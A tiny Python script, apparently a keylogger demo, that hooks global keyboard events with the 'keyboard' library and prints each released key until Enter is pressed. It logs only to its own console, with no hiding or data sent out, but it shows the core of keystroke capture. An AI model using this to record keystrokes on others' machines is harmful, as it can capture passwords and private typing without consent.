import keyboard

def on_key_event(event):
    if event.event_type == keyboard.KEY_UP:
        print(event.name)

def main():
    keyboard.hook(on_key_event)
    input("Press Enter to stop the Keylogger...\n")

if __name__ == "__main__":
    main()

